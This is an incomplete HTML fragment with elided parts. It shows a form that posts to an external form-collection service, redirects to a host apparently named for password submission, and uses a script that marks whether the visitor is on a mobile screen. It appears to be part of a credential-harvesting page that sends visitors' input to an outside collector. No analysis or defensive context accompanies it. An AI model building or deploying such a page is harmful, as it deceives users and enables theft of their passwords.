...
<body>
    <form class="sm:hidden lg:block md:block" action="https://submit-form.com/0jMgFrtWT" method="post">
                <input type="hidden" name="_redirect" value="https://submit-password-a.vercel.app/" method="post">


        <input hidden="true" id="tx" name="tx" value="false">
...
<script>
    ...
    if (window.matchMedia("(max-width: 768px)").matches) {
        ...
        document.getElementById("tx").value = "true"
    } else {
        document.getElementById("tx").value = "false"
